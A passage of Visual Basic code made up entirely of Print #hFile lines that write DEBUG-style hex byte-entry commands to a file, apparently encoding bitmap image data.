Print #hFile, "E BB50 4F 5F 66 5D 6E 71 56 65 67 41 51 50 AC BA B9 F3"
Print #hFile, "E BB60 FF FF CA D6 D8 89 94 98 82 8C 93 7F 89 90 80 8C"
Print #hFile, "E BB70 90 8A 96 9A B9 C6 C8 C3 D0 D2 9A A9 AB 90 9F A1"
Print #hFile, "E BB80 8F 9E A0 4E 5D 5F 49 58 5A 00 01 03 00 00 F6 F7"
Print #hFile, "E BB90 F5 E9 EA E8 DE DF DD D4 D5 D3 C1 C3 C3 B0 B4 B5"
Print #hFile, "E BBA0 00 00 05 9C A5 AE 8D 99 A5 81 91 9E 91 9F B1 9F"
Print #hFile, "E BBB0 AF C0 A7 B6 C6 8E 9E AB 97 A2 B0 92 9E AA 8F 9A"
Print #hFile, "E BBC0 A8 9D A8 B6 B3 BE CC 94 9F AD 62 6F 7D 87 94 A2"
Print #hFile, "E BBD0 97 A4 B2 70 7D 8B 94 A4 B1 A3 B3 C0 95 A5 B2 AA"
Print #hFile, "E BBE0 BA C7 CB DC E9 C2 D3 E0 B3 C4 D1 A7 B8 C5 CC DF"
Print #hFile, "E BBF0 EE D2 E5 F4 C5 D8 E7 B8 CB DA C1 D4 E1 C6 D9 E6"
Print #hFile, "E BC00 BA CD DA B1 C4 D1 9E B1 BE 9B AE BD AD C0 CF B4"
Print #hFile, "E BC10 C6 D7 A0 B1 C4 94 A5 B8 86 97 AC 91 A5 B7 DA EE"
Print #hFile, "E BC20 FF CC E0 F2 AC C0 D2 8D A0 B5 9B AD C4 9D AF C6"
Print #hFile, "E BC30 A4 B6 CD B2 C4 DB A6 B8 CF 9D AF C6 AB BD D4 A5"
Print #hFile, "E BC40 B7 CE 9E B1 C6 CF E3 F5 82 96 A8 7F 93 A4 79 8D"
Print #hFile, "E BC50 9E 8C A0 B1 C9 DD EE D3 E7 F8 AC C0 D1 6D 81 92"
Print #hFile, "E BC60 4F 63 74 2D 41 52 4A 5E 6F 75 89 9A 84 98 A9 63"
Print #hFile, "E BC70 77 88 73 87 98 8E A2 B3 74 88 99 6D 81 92 92 A4"
Print #hFile, "E BC80 B5 A7 BA C9 A4 B7 C6 B5 C8 D5 B6 CA D5 89 9E A6"
Print #hFile, "E BC90 86 9A A5 A9 BC C9 B5 C8 D7 A2 B5 C4 77 89 9A 82"
Print #hFile, "E BCA0 94 A5 AC BF CE AD C0 CD 90 A3 B0 76 88 93 62 73"
Print #hFile, "E BCB0 7C 5F 6F 76 55 63 69 43 52 54 45 55 54 33 44 41"
Print #hFile, "E BCC0 8B 99 97 D6 E4 E3 B5 C1 C3 7B 86 8A 6F 79 80 70"
Print #hFile, "E BCD0 7A 81 6E 78 7F 78 83 87 B1 BD BF BF CC CE AC BB"
Print #hFile, "E BCE0 BD A7 B9 BA B3 C5 C6 60 72 73 4E 60 61 00 06 07"
Print #hFile, "E BCF0 00 00 F9 FA F8 EC ED EB DF E0 DE D3 D4 D2 C0 C2"
Print #hFile, "E BD00 C2 B3 B7 B8 06 0C 11 B6 BF C8 94 A0 AC 6C 7C 89"
Print #hFile, "E BD10 7F 8D 9F A1 B1 C2 B5 C4 D4 A8 B8 C5 AC B7 C5 A3"
Print #hFile, "E BD20 AF BB 9A A5 B3 B1 BC CA B0 BB C9 88 93 A1 67 74"
Print #hFile, "E BD30 82 8F 9C AA 83 90 9E 6F 7C 8A A1 B1 BE 9B AB B8"
Print #hFile, "E BD40 8E 9E AB AA BA C7 BD CE DB C8 D9 E6 D2 E3 F0 A6"
Print #hFile, "E BD50 B6 C6 B1 C3 D4 CA DC ED D1 E3 F4 B6 C9 D8 AC BF"
Print #hFile, "E BD60 CE C9 DC E9 D8 EB F8 C6 D9 E6 BB CE DB A4 B7 C4"
Print #hFile, "E BD70 9B AE BB A8 BB CA B2 C4 D5 9B AD BE 86 98 A9 73"
Print #hFile, "E BD80 85 96 C6 D7 EA E5 F9 FF BD D1 E3 9D B1 C3 90 A3"
Print #hFile, "E BD90 B8 74 86 9D 98 AA C1 9A AC C3 A3 B5 CC A8 BA D1"
Print #hFile, "E BDA0 AD BF D6 7E 91 A6 92 A6 B8 D5 E9 FB 68 7C 8D 78"
Print #hFile, "E BDB0 8C 9D 6D 81 92 B1 C5 D6 C1 D5 E6 C4 D8 E9 77 8B"
Print #hFile, "E BDC0 9C 66 7A 8B 44 58 69 4F 63 74 71 85 96 7E 92 A3"
Print #hFile, "E BDD0 66 7A 8B 4A 5E 6F 7D 91 A2 8C A0 B1 67 7B 8C 8A"
Print #hFile, "E BDE0 9E AF AA BC CD A7 BA C9 A4 B7 C4 B8 CC D7 93 A8"
Print #hFile, "E BDF0 B0 72 87 8F A0 B4 BF AE C2 CD AA BD CC 8C 9F AE"
Print #hFile, "E BE00 8D 9F B0 A9 BB CC BD D0 DF AD C0 CD 79 8D 98 54"
Print #hFile, "E BE10 67 6F 5C 6B 74 62 72 79 62 70 76 51 60 62 4A 5A"
Print #hFile, "E BE20 59 42 53 50 A3 B1 AF EA F8 F6 B9 C5 C7 8B 97 99"
Print #hFile, "E BE30 7B 85 8C 7A 84 8B 7D 87 8E 91 9B A2 D0 DB DF E1"
Print #hFile, "E BE40 ED EF BB CA CC AD BF C0 B2 C1 C3 68 7A 7B 4F 5E"
Print #hFile, "E BE50 60 00 02 03 00 00 F8 F9 F7 ED EE EC DC DD DB D0"
Print #hFile, "E BE60 D1 CF C4 C6 C6 B6 BA BB 00 00 05 9B A4 AD 8C 98"
Print #hFile, "E BE70 A4 78 88 95 8E 9C AE 84 94 A5 89 98 A8 A9 B9 C6"
Print #hFile, "E BE80 B8 C3 D1 A6 B2 BE A1 AC BA B2 BD CB B4 BF CD 96"
Print #hFile, "E BE90 A1 AF 6C 77 85 73 7E 8C 68 75 83 84 91 9F A1 AE"
Print #hFile, "E BEA0 BC 9A A7 B5 8B 9B A8 9D AD BA A0 B0 BD AA BA C7"
Print #hFile, "E BEB0 CC DC E9 BA CA DA A9 BA CD B3 C4 D7 CB DC EF CA"
Print #hFile, "E BEC0 DC ED A9 BC CB 9E B1 C0 BB CC D9 D4 E5 F2 D2 E4"
Print #hFile, "E BED0 EF C1 D3 DE A2 B4 BF A3 B4 C1 C7 D8 E5 B9 C9 D9"
Print #hFile, "E BEE0 8F 9F AF 53 66 75 5F 71 82 E2 F4 FF E6 F8 FF 9E"
Print #hFile, "E BEF0 AF C2 75 86 99 67 78 8D 87 98 AD 7F 90 A5 97 A7"
Print #hFile, "E BF00 BE 95 A5 BC A7 B8 CD 6E 7F 94 9D AE C1 BC CD E0"
Print #hFile, "E BF10 50 62 73 6E 80 91 70 82 93 A3 B5 C6 D0 E2 F3 B6"
Print #hFile, "E BF20 C8 D9 7A 8C 9D 59 6B 7C 63 75 86 70 82 93 69 7B"
Print #hFile, "E BF30 8C 60 72 83 37 49 5A 70 82 93 9B AD BE 79 8B 9C"
Print #hFile, "E BF40 8B 9D AE A2 B4 C5 B4 C4 D4 B0 C0 D0 BA CB D8 97"
Print #hFile, "E BF50 A9 B4 7B 8E 96 9F B2 BA B9 CB D6 B6 C8 D3 A3 B3"
Print #hFile, "E BF60 C3 90 A0 B0 AF BF D0 B8 C8 D9 B1 C1 D1 9A AB B8"
Print #hFile, "E BF70 66 78 83 5D 70 78 59 68 71 5E 6C 72 67 76 79 6A"
Print #hFile, "E BF80 7A 79 62 73 70 4E 5F 5B 8B 99 97 AD BB B9 8F 9C"
Print #hFile, "E BF90 9E 91 9E A0 95 9F A6 7E 88 8F 63 6B 72 6E 76 7D"
Print #hFile, "E BFA0 B8 C1 C5 E1 EC F0 E2 EF F1 C2 D1 D3 A5 B2 B4 65"
Print #hFile, "E BFB0 74 76 4F 5C 5E 00 01 03 00 00 F4 F5 F3 EE EF ED"
Print #hFile, "E BFC0 DF E0 DE D0 D1 CF C5 C7 C7 B5 B9 BA 00 00 04 90"
Print #hFile, "E BFD0 99 A2 8C 98 A4 71 81 8E 8A 98 AA 82 92 A3 80 8F"
Print #hFile, "E BFE0 9F 9D AD BA A4 AF BD 96 A2 AE B2 BD CB A7 B2 C0"
Print #hFile, "E BFF0 B5 C0 CE A5 B0 BE 76 81 8F 71 7C 8A 79 86 94 98"
Print #hFile, "E C000 A5 B3 AD BA C8 B6 C3 D1 A1 B1 BE 9F AF BC A1 B1"
Print #hFile, "E C010 BE 9E AE BB BE CE DB DB EB FB C0 CF E2 A6 B7 CC"
Print #hFile, "E C020 A8 B9 CE C9 DA ED CE E0 F1 A6 B9 C8 92 A3 B0 9F"
Print #hFile, "E C030 B1 BC C3 D5 E0 D4 E6 F1 C3 D5 E0 B0 C2 CD C1 D2"
Print #hFile, "E C040 DF CA DB E8 AF BF CF 7B 8B 9B 34 47 56 87 9A A9"
Print #hFile, "E C050 E2 F4 FF C9 DB EC 6D 7E 91 51 62 75 63 74 89 7A"
Print #hFile, "E C060 8B A0 7A 8A A1 60 70 87 7D 8E A3 73 84 99 BE CF"
Print #hFile, "E C070 E2 B1 C2 D5 59 6B 7C 7C 8E 9F 78 8A 9B B9 CB DC"
Print #hFile, "E C080 CA DC ED 84 96 A7 70 82 93 4D 5F 70 50 62 73 55"
Print #hFile, "E C090 67 78 58 6A 7B 3A 4C 5D 4E 60 71 9F B1 C2 A0 B2"
Print #hFile, "E C0A0 C3 80 92 A3 A2 B4 C5 AE C0 D1 AE BE CE C0 D1 DE"
Print #hFile, "E C0B0 A9 BA C7 91 A3 AE A4 B7 BF BE D1 D9 C0 D2 DD BA"
Print #hFile, "E C0C0 CC D7 9D AD BD A2 B2 C2 B7 C7 D8 B5 C5 D5 B6 C6"
Print #hFile, "E C0D0 D6 99 AB B6 57 69 74 53 64 6D 5C 6C 73 58 66 6C"
Print #hFile, "E C0E0 57 66 69 61 71 70 66 77 74 59 6A 66 89 97 95 9F"
Print #hFile, "E C0F0 AD AB A1 AF AE C6 D3 D5 E6 F0 F7 E0 EA F1 C7 CF"
Print #hFile, "E C100 D6 B1 B9 C0 B6 BF C3 BA C3 C7 D1 DD DF CE DB DD"
Print #hFile, "E C110 B1 BD BF 64 71 73 45 51 53 00 01 03 00 00 F3 F4"
Print #hFile, "E C120 F2 F1 F2 F0 E1 E2 E0 D0 D1 CF C3 C5 C5 B4 B8 B9"
Print #hFile, "E C130 00 00 04 A0 A9 B2 81 8D 99 57 67 74 72 80 92 8A"
Print #hFile, "E C140 9A AB 92 A1 B1 9D AD BA 9C A7 B5 97 A3 AF BC C5"
Print #hFile, "E C150 D3 A8 B1 BF B1 BC CA 94 9F AD 76 81 8F 7F 8A 98"
Print #hFile, "E C160 93 9E AC 92 9D AB 8B 98 A6 9A A7 B5 96 A6 B3 8E"
Print #hFile, "E C170 9E AB 94 A4 B1 A1 B1 BE B2 C2 CF C3 D3 E3 D4 E2"
Print #hFile, "E C180 F8 B3 C3 DA 95 A6 BB 9E AF C2 C2 D4 E5 CC DF EE"
Print #hFile, "E C190 B7 C8 D5 A2 B4 BF 8F A1 AC B5 C8 D0 C6 D7 E0 C1"
Print #hFile, "E C1A0 D2 DB B3 C3 CF C1 D1 DD C7 D7 E4 CC DD EA 8B 9E"
Print #hFile, "E C1B0 AB 51 64 71 95 A8 B7 EA FC FF AB BC CF 50 61 74"
Print #hFile, "E C1C0 31 42 57 66 77 8C 70 81 96 4C 5D 72 5E 6F 84 7E"
Print #hFile, "E C1D0 8F A4 BB CC DF 99 AA BD 56 68 79 6F 81 92 A7 B9"
Print #hFile, "E C1E0 CA DB ED FE 92 A4 B5 46 58 69 43 55 66 48 5A 6B"
Print #hFile, "E C1F0 40 52 63 50 62 73 59 6B 7C 55 67 78 98 AA BB AC"
Print #hFile, "E C200 BE CF 96 A8 B9 A2 B4 C5 AC BE CF B9 CB DC C0 D0"
Print #hFile, "E C210 E0 BE CF DC 93 A4 B1 AC BE C9 C3 D6 DE AB BE C6"
Print #hFile, "E C220 AF C1 CC A4 B6 C1 9A AA BA B9 C9 D9 C2 D2 E3 C3"
Print #hFile, "E C230 D3 E3 C0 D0 E0 98 AA B5 61 73 7E 42 53 5C 41 4E"
Print #hFile, "E C240 56 3D 49 4D 46 53 55 4E 5C 5B 46 57 54 5A 6B 67"
Print #hFile, "E C250 BA C9 C5 E4 F2 F0 D9 E7 E6 D2 DF E1 C7 D1 D8 C8"
Print #hFile, "E C260 D2 D9 E8 F0 F7 F1 F9 FF DE E7 EB D0 D9 DD A7 B0"
Print #hFile, "E C270 B3 A2 AE B0 A2 AB AE 64 70 72 41 4A 4D 00 01 03"
Print #hFile, "E C280 00 00 FA F8 F7 F0 F1 EF DB DC DA CC CC CC C3 C5"
Print #hFile, "E C290 C5 B5 B9 BA 00 00 05 A3 AC B5 96 A2 AE 78 85 93"
Print #hFile, "E C2A0 79 88 98 76 85 95 70 7F 8F 8B 98 A8 9E A9 B7 9B"
Print #hFile, "E C2B0 A6 B4 B0 B9 C7 B3 BC C9 B4 BF CD 77 83 8F 63 6E"
Print #hFile, "E C2C0 7C 75 81 8D 8C 97 A5 7A 86 92 7A 85 93 7E 8A 96"
Print #hFile, "E C2D0 93 A0 AE 8F 9D A9 8F 9C AA B4 C4 D0 BA CA D7 95"
Print #hFile, "E C2E0 A5 B5 CA D9 EC CA D8 EE B5 C3 D9 8D 9C AF 88 98"
Print #hFile, "E C2F0 A9 B3 C3 D3 CB DC E9 B8 C9 D6 9C AC B8 92 A2 AE"
Print #hFile, "E C300 95 A5 B1 B7 C7 D3 BD CD DA C1 D1 DE AC BB CB BA"
Print #hFile, "E C310 CA DA BF CF DF 98 AB BA 61 74 83 A4 B6 C7 DC ED"
Print #hFile, "E C320 FF A4 B5 C8 3A 4B 60 24 35 4A 44 55 6A 36 47 5C"
Print #hFile, "E C330 43 54 69 78 89 9E 9B AC C1 86 97 AA 61 72 85 78"
Print #hFile, "E C340 89 9C A9 BA CD 97 A8 BB 4B 5C 6F 34 46 57 3B 4D"
Print #hFile, "E C350 5E 46 58 69 5F 71 82 61 73 84 55 67 78 98 AA BB"
Print #hFile, "E C360 C2 D4 E5 A7 B9 CA 9A AB BE B6 C7 DA C2 D3 E6 C0"
Print #hFile, "E C370 D1 E4 C4 D7 E6 8C 9F AC 92 A4 AF B0 C2 CD AD C0"
Print #hFile, "E C380 C8 AC BF C7 AE C0 CB A6 B8 C3 AD BD CA D0 DF EF"
Print #hFile, "E C390 C0 CF DF AC BC C9 83 93 9F 69 78 81 79 89 90 63"
Print #hFile, "E C3A0 73 79 6D 79 7F 49 55 5B 51 5D 61 5E 6C 6B 4F 5D"
Print #hFile, "E C3B0 5C 78 86 84 DF ED EB EB F9 F7 E5 F3 F2 E5 F2 F4"
Print #hFile, "E C3C0 D6 E1 E5 C4 CE D5 D1 D9 E0 D8 E0 E7 D3 DC E0 E8"
Print #hFile, "E C3D0 F1 F5 DA E6 E8 B8 C4 C6 B1 BA BD 6E 77 7A 4D 56"
Print #hFile, "E C3E0 59 00 08 0B 00 00 FA F5 F6 EC EA EA DD DD DD D1"
Print #hFile, "E C3F0 D3 D4 BD C1 C2 BC C1 C4 00 00 04 8D 96 9F 71 7D"
Print #hFile, "E C400 87 73 81 8D 90 9D AB 87 94 A4 77 84 94 86 90 A1"
Print #hFile, "E C410 92 9C AD A4 AE BF 8B 94 A1 9E A8 B2 9A A6 B2 63"
Print #hFile, "E C420 72 7B 6E 7C 88 85 94 9D 92 9E AA 84 90 9A 89 91"
Print #hFile, "E C430 9E 8F 98 A2 99 A1 AE 98 A2 AC 91 9D A9 AF BE C7"
Print #hFile, "E C440 CB DD E8 B3 C5 D0 BA C9 D9 D9 E5 F7 C8 D6 E8 A7"
Print #hFile, "E C450 B5 C7 91 A0 B0 9C AB BB A7 B6 C6 BE CD DD B4 C1"
Print #hFile, "E C460 D1 98 A7 B7 83 92 A2 75 84 94 7F 8E 9E A7 B6 C6"
Print #hFile, "E C470 B6 C4 D6 99 A9 BA 7C 8C 9D 89 9B AC 9E B0 C1 9A"
Print #hFile, "E C480 AC BD B2 C3 D6 CA DB EE 93 A4 B7 58 69 7C 2A 3B"
Print #hFile, "E C490 50 30 41 56 51 62 77 74 85 9A 78 89 9E 74 85 9A"
Print #hFile, "E C4A0 81 92 A7 91 A2 B7 84 95 AA 60 71 86 43 54 69 3F"
Print #hFile, "E C4B0 50 63 4E 5F 72 64 75 88 69 7B 8C 5B 6D 7E A6 B8"
Print #hFile, "E C4C0 C9 C2 D4 E5 A7 B8 CB 94 A5 B8 B0 C1 D6 B8 C8 DF"
Print #hFile, "E C4D0 B4 C4 DB BD CE E3 9A AC BD 7D 93 9F AA BE C9 B4"
Print #hFile, "E C4E0 C9 D1 A6 B9 C1 AE C1 C9 A7 B7 C3 B1 C1 CD CA D8"
Print #hFile, "E C4F0 E4 D9 E5 F1 B1 BD C9 84 8E 98 79 85 8B 82 8D 91"
Print #hFile, "E C500 89 95 95 83 8F 8F 81 8B 92 7D 86 8F 7B 85 8C 75"
Print #hFile, "E C510 80 84 6A 75 79 8F 9B 9D BF CB CB B6 C2 C2 D5 E1"
Print #hFile, "E C520 E3 E1 ED EF E6 F2 F4 E2 ED F1 D6 E1 E5 DC E7 EB"
Print #hFile, "E C530 E7 F0 F4 CF DA DE CA D7 D9 C3 D0 D2 B4 BD C0 9B"
Print #hFile, "E C540 A2 A5 78 7F 82 02 09 0C 00 00 FB F6 F7 EC EA EA"
Print #hFile, "E C550 E0 DD DF D3 D5 D6 BD C0 C4 B7 BE C1 00 01 05 A6"
Print #hFile, "E C560 B0 B7 7B 86 8E 70 7C 86 78 84 90 79 86 94 83 8D"
Print #hFile, "E C570 9E 8A 94 A5 81 8B 9D 95 9F B0 95 9E AB A3 AF B9"
Print #hFile, "E C580 8B 9A A3 64 73 7C 71 82 8B 84 95 9E 8F 9B A5 8E"
Print #hFile, "E C590 98 A2 A4 AD B7 98 9E A9 84 8A 95 97 A0 AA B2 BC"
Print #hFile, "E C5A0 C6 AA B9 C2 A6 B9 C1 AF C1 CC BE CB D9 DA E4 F5"
Print #hFile, "E C5B0 DB E8 F8 D7 E4 F4 BD CA DA A4 B1 C1 99 A5 B7 AF"
Print #hFile, "E C5C0 BB CD BB C7 D9 B0 BE D0 A3 B1 C3 96 A4 B6 76 84"
Print #hFile, "E C5D0 96 4A 58 6A 4F 5D 70 7F 8E A1 88 98 A9 7D 8F A0"
Print #hFile, "E C5E0 89 99 AA 81 93 A4 7F 8E A1 83 94 A7 86 95 A8 98"
Print #hFile, "E C5F0 A9 BC 70 7E 94 59 6A 7F 5E 6C 82 78 89 9E 8B 99"
Print #hFile, "E C600 B0 89 99 B0 85 93 AA 7C 8C A3 6C 7A 91 48 58 6F"
Print #hFile, "E C610 46 54 6A 59 6A 7F 59 68 7B 54 66 77 7F 8F A0 B3"
Print #hFile, "E C620 C5 D6 BE CE DF 95 A7 B8 96 A6 B7 98 A9 BC AC BA"
Print #hFile, "E C630 D0 CE DE F5 C5 D2 EC A7 B7 CE 8B 9D AE A6 BC C8"
Print #hFile, "E C640 B5 CB D6 B7 CC D4 B8 CB D3 B3 C6 CE B9 C9 D5 C6"
Print #hFile, "E C650 D6 E2 D2 E0 EC A4 B0 BC 76 7F 8C 75 7E 88 84 8E"
Print #hFile, "E C660 95 88 91 94 83 8E 8C 7E 88 88 7C 84 8B 71 78 81"
Print #hFile, "E C670 82 89 92 8D 97 9E 80 8B 8F A4 AF B3 DF EB ED E0"
Print #hFile, "E C680 EC EE A5 B1 B3 AD B9 BB AE BA BC B9 C5 C7 BD C8"
Print #hFile, "E C690 CC BE C9 CD D3 DC E0 E0 EB EF B3 BF C3 95 A1 A5"
Print #hFile, "E C6A0 8C 95 99 88 8E 93 6D 73 78 00 00 04 00 00 FF FE"
Print #hFile, "E C6B0 FD F1 EF EE E5 E3 E3 D5 D7 D7 BC C0 C1 B1 B8 BB"
Print #hFile, "E C6C0 00 02 06 BC C6 CD 7B 86 8E 5E 6A 74 7B 87 93 91"
Print #hFile, "E C6D0 9D A9 7C 87 95 81 8C 9A 8F 99 AA 9E A9 B7 B6 C2"
Print #hFile, "E C6E0 CE AA B6 C0 78 87 90 6A 7B 84 76 87 90 8D 9E A7"
Print #hFile, "E C6F0 9D A9 B3 9C A6 B0 B4 BD C7 B6 BF C9 84 8D 97 7F"
Print #hFile, "E C700 89 93 AA B6 C0 92 A3 AC 67 7A 82 66 79 81 A2 B0"
Print #hFile, "E C710 BC D3 DE EC DF EA F8 E1 EC FA D5 E2 F0 C9 D6 E4"
Print #hFile, "E C720 AB B8 C8 94 A1 B1 A7 B5 C7 C5 D3 E5 B7 C5 D7 94"
Print #hFile, "E C730 A4 B5 92 A1 B4 8B 9A AD 67 76 89 49 58 6B 43 53"
Print #hFile, "E C740 64 51 61 72 68 76 89 59 68 7B 4E 5C 6F 54 63 76"
Print #hFile, "E C750 5C 69 7F 6E 7C 92 86 93 A9 62 70 86 59 65 7D 76"
Print #hFile, "E C760 84 9B 91 9D B5 92 A0 B7 88 94 AC 7D 8B A2 6C 78"
Print #hFile, "E C770 90 64 72 89 53 60 76 45 53 69 60 6E 81 93 A3 B4"
Print #hFile, "E C780 AE BC CE A2 B2 C2 81 90 A0 9E AE BE 9F AE BE AA"
Print #hFile, "E C790 BA CB C3 D1 E4 CA D8 EE BD CA E0 92 A0 B6 84 97"
Print #hFile, "E C7A0 A6 C7 DA E7 C1 D5 E0 B3 C7 D2 B3 C6 CE B3 C6 CE"
Print #hFile, "E C7B0 D1 E1 ED D0 E0 ED 8B 98 A6 71 7C 8A 6F 7A 88 7D"
Print #hFile, "E C7C0 86 93 82 8D 95 83 8E 92 7C 88 8A 73 7F 81 89 91"
Print #hFile, "E C7D0 98 85 8C 95 94 9B A4 9B A3 AA 86 8F 93 93 9C A0"
Print #hFile, "E C7E0 CA D3 D6 E9 F3 F3 E7 F1 F1 D9 E3 E3 D0 DA DA DD"
Print #hFile, "E C7F0 E7 E7 CD D6 D9 A4 AD B0 9D A4 A7 A6 AF B3 AB B5"
Print #hFile, "E C800 BC 7E 88 8F 88 90 97 9D A3 AA 8E 94 9B 00 01 08"
Print #hFile, "E C810 00 00 F9 F5 F4 EB E9 E8 DF DF DF D2 D4 D4 BD C1"
Print #hFile, "E C820 C2 B6 BB BC 00 07 0A D0 D9 DD 8A 94 9B 7B 86 8E"
Print #hFile, "E C830 8A 94 9E 95 A1 AD 8B 97 A3 87 92 A0 91 9C AA B0"
Print #hFile, "E C840 BB C9 C1 CD D9 90 9F A8 57 68 71 75 86 8F 88 99"
Print #hFile, "E C850 A2 A9 BA C3 C1 CD D7 BA C6 D0 8F 99 A3 A6 AF B9"
Print #hFile, "E C860 83 8C 96 77 81 8B 98 A4 AE 8A 9B A4 5F 72 7A 4E"
Print #hFile, "E C870 61 69 7B 8A 93 C2 CE D8 DA E6 F2 DE EA F6 D3 DF"
Print #hFile, "E C880 EB D2 DF ED C9 D6 E4 B5 C2 D2 80 8F 9F 8B 9B AC"
Print #hFile, "E C890 AD BD CE C0 D0 E1 A3 B2 C5 74 85 98 62 73 86 66"
Print #hFile, "E C8A0 77 8A 4A 58 6B 2F 3D 4F 2B 39 4C 2F 3D 50 35 43"
Print #hFile, "E C8B0 56 39 47 5A 41 4E 64 5B 68 7E 77 84 9A 77 84 9A"
Print #hFile, "E C8C0 75 81 99 78 84 9C 87 93 AB 95 A1 B9 8E 9A B2 7A"
Print #hFile, "E C8D0 86 9E 53 5F 77 4D 59 71 48 55 6B 56 64 77 79 87"
Print #hFile, "E C8E0 9A 97 A5 B7 90 9F AF 75 84 94 8A 99 A9 94 A3 B3"
Print #hFile, "E C8F0 B6 C5 D5 C8 D7 E7 C1 CF E1 AE BC CE 8E 9C AF 79"
Print #hFile, "E C900 87 99 BF CF DF C1 D4 E1 AF C2 CF B5 C9 D4 B6 C8"
Print #hFile, "E C910 D3 B5 C7 D2 BA CA D7 8F 9E AE 62 6F 7F 6F 7C 8C"
Print #hFile, "E C920 86 93 A3 7A 85 93 60 6C 78 66 73 7B 75 83 89 7F"
Print #hFile, "E C930 8B 91 85 8C 95 94 99 A2 90 98 9F 8D 95 9C 89 92"
Print #hFile, "E C940 96 82 8B 8E 9E A7 AA D2 DC DC ED F7 F7 D3 DD DD"
Print #hFile, "E C950 C6 D0 D0 D9 E3 E3 DC E5 E8 CF D8 DB D8 DF E2 DB"
Print #hFile, "E C960 E4 E8 BB C5 CC 81 8A 93 7C 83 8C 7F 84 8D 75 7A"
Print #hFile, "E C970 83 00 00 07 00 00 F5 F4 F0 EC EB E7 DF E0 DE CE"
Print #hFile, "E C980 D1 CF BE C3 C2 B7 BC BD 00 01 04 CD D6 DA BD C8"
Print #hFile, "E C990 CC A8 B4 BA A1 AC B4 9F A9 B3 A6 B0 BA A1 AA B7"
Print #hFile, "E C9A0 9C A5 B2 A2 AE BA EB F7 FF A5 B3 BF 65 75 81 8C"
Print #hFile, "E C9B0 9C A8 A1 B1 BD AC BC C8 AF BB C7 AC B8 C4 9E A7"
Print #hFile, "E C9C0 B4 96 9F AC 95 9E AB A2 AB B8 93 9F AB 73 83 8F"
Print #hFile, "E C9D0 6A 7C 87 63 76 7E 7B 88 90 9C A7 AF A9 B3 BD D5"
Print #hFile, "E C9E0 E1 EB DF EB F5 D3 DF EB CD DB E7 C6 D3 E1 B4 C3"
Print #hFile, "E C9F0 D3 79 89 99 69 79 8A 8F A1 B2 B1 C2 D5 B2 C6 D8"
Print #hFile, "E CA00 96 A9 BE 71 82 95 5F 6D 80 42 4D 61 31 3C 50 30"
Print #hFile, "E CA10 3B 4F 35 40 56 37 42 58 36 41 57 42 4D 63 56 60"
Print #hFile, "E CA20 78 7D 87 9F 83 8D A5 6A 74 8C 75 7F 97 9A A4 BC"
Print #hFile, "E CA30 93 9C B7 6A 73 8E 58 62 7A 4F 59 71 54 5F 75 66"
Print #hFile, "E CA40 71 85 67 72 86 5D 69 7B 69 76 86 85 92 A2 AC B9"
Print #hFile, "E CA50 C7 C7 D4 E2 CB D8 E6 BF CC DA AA B7 C7 77 84 94"
Print #hFile, "E CA60 75 82 92 C2 D1 E1 C0 D0 E0 A8 B9 C6 BC CD DA CE"
Print #hFile, "E CA70 E0 EB BC CE D9 AB BD C8 93 A4 B1 76 86 96 77 85"
Print #hFile, "E CA80 97 7B 89 9C 86 94 A7 79 85 97 63 70 80 5C 69 77"
Print #hFile, "E CA90 5D 6B 77 6C 78 82 72 7B 84 82 89 92 84 8A 91 86"
Print #hFile, "E CAA0 8C 93 93 99 9E 89 90 93 84 8B 8E 9E A6 A6 E7 EF"
Print #hFile, "E CAB0 EF EF F7 F7 D9 E1 E1 CF D7 D7 E0 E7 EA EA F1 F4"
Print #hFile, "E CAC0 E7 F0 F3 DC E5 E9 A0 AA B1 7B 84 8D 79 80 89 6A"
Print #hFile, "E CAD0 6F 78 61 66 6F 00 00 07 00 00 FC FB F7 EF F0 EC"
Print #hFile, "E CAE0 E2 E3 E1 CE D1 CF BF C4 C3 B4 B9 B8 00 00 01 CC"
Print #hFile, "E CAF0 D3 D6 EF F8 FB CE D9 DD C0 CA D1 B5 C0 C8 D0 DB"
Print #hFile, "E CB00 E3 CB D5 DF B8 C2 CC 9A A4 AE C0 CE DA 81 8F 9B"
Print #hFile, "E CB10 5D 6D 79 89 99 A5 A9 B9 C5 AA B8 C4 AD B9 C5 C6"
Print #hFile, "E CB20 D2 DE C4 CD DA AA B3 C0 C1 CA D7 C7 D3 DF 81 8F"
Print #hFile, "E CB30 9B 68 78 84 80 92 9D 69 7A 83 A3 AF B5 A1 AB B2"
Print #hFile, "E CB40 8D 97 9E BE C9 D1 DE E9 F1 E1 ED F7 DF EE F7 C9"
Print #hFile, "E CB50 D9 E5 C9 D9 E6 C8 D8 E8 A1 B4 C3 6B 7F 90 66 7A"
Print #hFile, "E CB60 8C 8B A1 B3 A8 BD D2 AD C0 D5 A0 AE C1 80 8B 9F"
Print #hFile, "E CB70 67 72 86 57 62 76 41 4C 62 2E 39 4F 39 44 5A 59"
Print #hFile, "E CB80 64 7A 45 4F 67 58 62 7A 58 62 7A 51 5B 73 63 6D"
Print #hFile, "E CB90 85 7B 85 9D 74 7D 98 5C 65 80 51 5B 73 57 61 79"
Print #hFile, "E CBA0 53 5D 75 50 5B 71 5F 6A 7E 80 8C 9E A5 B1 C3 C0"
Print #hFile, "E CBB0 CD DD C3 D0 E0 C3 D0 DE B2 BF CD 8C 99 A7 60 6D"
Print #hFile, "E CBC0 7B 80 8D 9B C6 D3 E1 BF CF DC 9C AB BB BB CB DB"
Print #hFile, "E CBD0 E6 F6 FF C6 D7 E4 A0 B2 BD 9A AB B8 88 98 A8 8D"
Print #hFile, "E CBE0 9D AE 81 8F A2 85 92 A8 87 94 AA 81 8F A5 7E 8C"
Print #hFile, "E CBF0 9F 6F 7F 90 59 68 78 4F 5C 6A 53 5D 67 62 69 72"
Print #hFile, "E CC00 7C 83 8C 8B 93 9A 92 98 9F 8F 95 9A 80 87 8A 77"
Print #hFile, "E CC10 7F 7F B5 BC BF F4 FC FC F0 F7 FA D4 DD E0 DB E2"
Print #hFile, "E CC20 E5 CB D4 D8 A4 AD B1 85 90 94 7B 87 8D 7E 88 8F"
Print #hFile, "E CC30 8E 96 9D 87 8D 94 7D 83 8A 01 07 0E 00 00 F7 F8"
Print #hFile, "E CC40 F4 EA EB E7 DE DF DB CE D2 CD C2 C7 C5 B5 BA B9"
Print #hFile, "E CC50 00 01 00 E4 EC EC F5 FE FF F4 FF FF D4 DF E3 AC"
Print #hFile, "E CC60 B6 BD E9 F3 FA DA E3 EC C4 CD D6 C2 CD D5 A1 B0"
Print #hFile, "E CC70 B9 5C 6C 78 7A 88 94 A5 B3 BF 9E AC B8 8A 98 A4"
